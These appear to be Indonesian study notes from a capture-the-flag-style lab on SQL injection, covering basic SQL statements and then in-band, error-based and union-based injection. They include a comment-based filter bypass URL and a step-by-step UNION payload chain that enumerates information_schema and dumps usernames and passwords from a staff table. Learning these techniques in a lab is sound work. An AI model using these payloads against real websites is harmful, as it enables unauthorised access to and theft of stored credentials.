## sql

```
select * from users; => semua table yang di users
select username,password from users; => hanya username dan passwd dari user
select * from users LIMIT 1; => semua table tapi hanya 1 baris
select * from users where username='admin'; => semua table tapi hanya baris yang usernamnya admin

select * from users where username != 'admin'; => semua table tapi selain username admin
select * from users where username='admin' or username='jon'; => baris user admin, jhon bakal tampil
select * from users where username='admin' and password='p4ssword'; => hanya baris yang user admin dan password

select * from users where username like 'a%'; => hanya baris yang usernamenya diawali huruf a
select * from users where username like '%n'; => hanya baris yang usernmnya diakhiri huruf n
select * from users where username like '%mi%'; => hanya baris yang usernamnya di dalamnya ada mi

UNION => Pernyataan UNION menggabungkan hasil dari dua atau lebih pernyataan SELECT untuk mengambil data dari satu atau beberapa tabel; 
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;

insert => masukan data
insert into users (username,password) values ('bob','password123');

update => update data
update users SET username='root',password='pass123' where username='admin';

delete => delete data
delete from users where username='martin';
delete from users; => semua table users
```

## conoth
```
Titik koma di URL menandakan akhir dari pernyataan SQL, dan dua tanda hubung menyebabkan semuanya setelah itu diperlakukan sebagai komentar. Dengan melakukan ini, Anda hanya, pada kenyataannya, menjalankan query:

Which akan mengembalikan artikel dengan ID 2 apakah itu diatur ke publik atau tidak.https://website.thm/blog?id=1SELECT * from blog where id=1 and private=0 LIMIT 1;https://website.thm/blog?id=2;--SELECT * from blog where id=2;-- and private=0 LIMIT 1;SELECT * from blog where id=2;--
```

## sql injection
- In-Band SQL Injection
    -  jenis yang paling mudah untuk dideteksi dan dieksploitasi; In-Band hanya mengacu pada metode komunikasi yang sama yang digunakan untuk mengeksploitasi kerentanan dan juga menerima hasilnya, misalnya, menemukan kerentanan SQL Injection pada halaman situs web dan kemudian dapat mengekstrak data dari database ke halaman yang sama.
- Error-Based SQL Injection
    - Jenis SQL Injection adalah yang paling berguna untuk dengan mudah memperoleh informasi tentang struktur database, karena pesan kesalahan dari database dicetak langsung ke layar browser. Ini sering dapat digunakan untuk menghitung seluruh databas
- Union-Based SQL Injection
    - Jenis injeksi ini menggunakan operator SQL UNION bersama pernyataan SELECT untuk mengembalikan hasil tambahan ke halaman. Metode ini adalah cara paling umum untuk mengekstrak data dalam jumlah besar melalui kerentanan SQL Injection.

```
1 UNION select 1,2,3 
0 UNION select 1,2,database()
0 UNION select 1,2,group_concat(table_name)
0 UNION select 1,2,group_concat(table_name) FROM information_schema.tables
0 UNION select 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

